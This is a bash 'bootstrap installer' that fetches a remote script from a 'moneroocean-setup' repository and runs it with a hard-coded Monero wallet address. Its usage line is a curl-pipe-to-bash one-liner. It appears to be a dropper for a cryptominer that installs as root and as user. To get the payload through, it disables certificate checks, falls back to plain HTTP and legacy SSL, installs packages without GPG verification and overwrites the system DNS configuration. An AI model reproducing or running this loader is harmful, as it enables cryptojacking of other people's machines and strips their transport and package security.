#!/bin/bash
# ==================== SELF-HEALING BOOTSTRAP INSTALLER ====================
# This wrapper automatically handles SSL/TLS errors and downloads the main script
# Usage: curl -L http://your-server/bootstrap_installer.sh | bash -s <wallet>
# ===========================================================================

set -uo pipefail

WALLET="${1:-49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso}"
MAIN_SCRIPT_URL="https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_and_user_FINAL_CLEAN.sh"

echo "========================================"
echo "BOOTSTRAP INSTALLER - Self-Healing Mode"
echo "========================================"

# ==================== SSL/TLS FIX FUNCTIONS ====================

# Detect system type and version
detect_system() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_NAME="$ID"
        OS_VERSION="$VERSION_ID"
    elif [ -f /etc/redhat-release ]; then
        OS_NAME="rhel"
        OS_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null | head -1)
    else
        OS_NAME="unknown"
        OS_VERSION="unknown"
    fi
    
    echo "[*] Detected: $OS_NAME $OS_VERSION"
}

# Check if curl/wget have SSL problems
test_ssl_connectivity() {
    local test_url="https://raw.githubusercontent.com"
    
    echo "[*] Testing SSL/TLS connectivity..."
    
    # Test curl
    if command -v curl >/dev/null 2>&1; then
        if curl -s --max-time 5 --head "$test_url" >/dev/null 2>&1; then
            echo "[✓] curl: SSL/TLS working"
            return 0
        else
            echo "[!] curl: SSL/TLS FAILED"
        fi
    fi
    
    # Test wget
    if command -v wget >/dev/null 2>&1; then
        if wget --timeout=5 --spider "$test_url" >/dev/null 2>&1; then
            echo "[✓] wget: SSL/TLS working"
            return 0
        else
            echo "[!] wget: SSL/TLS FAILED"
        fi
    fi
    
    echo "[!] SSL/TLS not working on this system"
    return 1
}

# Install or update download tools
install_download_tools() {
    echo "[*] Installing/updating download tools..."
    
    # Detect package manager and install
    if command -v yum >/dev/null 2>&1; then
        echo "[*] Using yum..."
        yum install -y curl wget ca-certificates openssl 2>/dev/null || \
        yum install -y --nogpgcheck curl wget ca-certificates openssl 2>/dev/null || true
    elif command -v apt-get >/dev/null 2>&1; then
        echo "[*] Using apt-get..."
        apt-get update -qq 2>/dev/null
        apt-get install -y curl wget ca-certificates openssl 2>/dev/null || true
    elif command -v dnf >/dev/null 2>&1; then
        echo "[*] Using dnf..."
        dnf install -y curl wget ca-certificates openssl 2>/dev/null || true
    fi
}

# Fix SSL certificates
fix_ssl_certificates() {
    echo "[*] Fixing SSL certificates..."
    
    # Update CA certificates
    if command -v update-ca-certificates >/dev/null 2>&1; then
        update-ca-certificates 2>/dev/null || true
    elif command -v update-ca-trust >/dev/null 2>&1; then
        update-ca-trust 2>/dev/null || true
    fi
}

# Fix DNS
fix_dns() {
    echo "[*] Configuring reliable DNS..."
    
    # Backup original
    [ -f /etc/resolv.conf ] && cp /etc/resolv.conf /etc/resolv.conf.backup.bootstrap 2>/dev/null
    
    # Set Cloudflare and Google DNS
    cat > /etc/resolv.conf << 'EOF'
nameserver 1.1.1.1
nameserver 8.8.8.8
nameserver 8.8.4.4
EOF
    
    echo "[✓] DNS configured"
}

# Enhanced download with multiple fallback methods
smart_download() {
    local url="$1"
    local output="${2:-/tmp/downloaded_script.sh}"
    local max_attempts=3
    local attempt=0
    
    echo "[*] Smart download from: $url"
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        echo "[*] Attempt $attempt of $max_attempts..."
        
        # Method 1: curl with HTTPS
        if command -v curl >/dev/null 2>&1; then
            echo "  [1] Trying curl with HTTPS..."
            if curl -f -L --max-time 30 "$url" -o "$output" 2>/dev/null; then
                echo "[✓] Downloaded successfully with curl HTTPS"
                return 0
            fi
            
            # Method 2: curl with --insecure
            echo "  [2] Trying curl with --insecure..."
            if curl -f -L --insecure --max-time 30 "$url" -o "$output" 2>/dev/null; then
                echo "[✓] Downloaded successfully with curl --insecure"
                return 0
            fi
            
            # Method 3: curl with SSLv3/TLSv1 (ancient systems)
            echo "  [3] Trying curl with legacy SSL..."
            if curl -f --sslv3 --tlsv1 --max-time 30 "$url" -o "$output" 2>/dev/null; then
                echo "[✓] Downloaded successfully with legacy SSL"
                return 0
            fi
        fi
        
        # Method 4: wget with HTTPS
        if command -v wget >/dev/null 2>&1; then
            echo "  [4] Trying wget with HTTPS..."
            if wget --timeout=30 "$url" -O "$output" 2>/dev/null; then
                echo "[✓] Downloaded successfully with wget HTTPS"
                return 0
            fi
            
            # Method 5: wget with --no-check-certificate
            echo "  [5] Trying wget with --no-check-certificate..."
            if wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null; then
                echo "[✓] Downloaded successfully with wget --no-check-certificate"
                return 0
            fi
        fi
        
        # Method 6: Try HTTP instead of HTTPS
        local http_url="${url/https:/http:}"
        if [ "$http_url" != "$url" ]; then
            echo "  [6] Trying HTTP fallback..."
            
            if command -v curl >/dev/null 2>&1; then
                if curl -f -L --max-time 30 "$http_url" -o "$output" 2>/dev/null; then
                    echo "[✓] Downloaded successfully via HTTP (curl)"
                    return 0
                fi
            fi
            
            if command -v wget >/dev/null 2>&1; then
                if wget --timeout=30 "$http_url" -O "$output" 2>/dev/null; then
                    echo "[✓] Downloaded successfully via HTTP (wget)"
                    return 0
                fi
            fi
        fi
        
        # If not last attempt, try fixing SSL/DNS
        if [ $attempt -lt $max_attempts ]; then
            echo "[!] All methods failed on attempt $attempt"
            
            if [ $attempt -eq 1 ]; then
                echo "[*] Attempting SSL/DNS fixes..."
                fix_dns
                install_download_tools
                fix_ssl_certificates
                sleep 2
            fi
        fi
    done
    
    echo "[ERROR] All download methods failed after $max_attempts attempts"
    return 1
}

# ==================== MAIN EXECUTION ====================

# Initialize
detect_system

# Test SSL connectivity
if ! test_ssl_connectivity; then
    echo "[!] SSL/TLS problems detected - applying fixes..."
    fix_dns
    install_download_tools
    fix_ssl_certificates
    sleep 2
fi

# Download main script
TEMP_SCRIPT="/tmp/main_installer_$$.sh"

echo ""
echo "========================================"
echo "Downloading main installer script..."
echo "========================================"

if smart_download "$MAIN_SCRIPT_URL" "$TEMP_SCRIPT"; then
    echo "[✓] Main script downloaded successfully"
    echo ""
    
    # Verify it's actually a bash script
    if head -1 "$TEMP_SCRIPT" | grep -q "^#!/bin/bash\|^#!/bin/sh"; then
        echo "[✓] Script verified"
        echo ""
        echo "========================================"
        echo "Executing main installer..."
        echo "========================================"
        echo ""
        
        # Make executable and run
        chmod +x "$TEMP_SCRIPT"
        bash "$TEMP_SCRIPT" "$WALLET"
        exit_code=$?
        
        # Cleanup
        rm -f "$TEMP_SCRIPT"
        
        echo ""
        echo "========================================"
        echo "Installation completed (exit code: $exit_code)"
        echo "========================================"
        
        exit $exit_code
    else
        echo "[ERROR] Downloaded file is not a valid bash script"
        echo "[*] First line: $(head -1 "$TEMP_SCRIPT")"
        rm -f "$TEMP_SCRIPT"
        exit 1
    fi
else
    echo "[ERROR] Failed to download main script after all attempts"
    echo ""
    echo "Please try one of these alternatives:"
    echo "1. Manual download:"
    echo "   wget --no-check-certificate $MAIN_SCRIPT_URL -O installer.sh"
    echo "   bash installer.sh $WALLET"
    echo ""
    echo "2. HTTP version (if available):"
    echo "   curl -L ${MAIN_SCRIPT_URL/https:/http:} | bash -s $WALLET"
    echo ""
    echo "3. Update curl/wget first:"
    echo "   yum install -y curl wget  # for RHEL/CentOS"
    echo "   apt-get install curl wget  # for Debian/Ubuntu"
    
    rm -f "$TEMP_SCRIPT"
    exit 1
fi
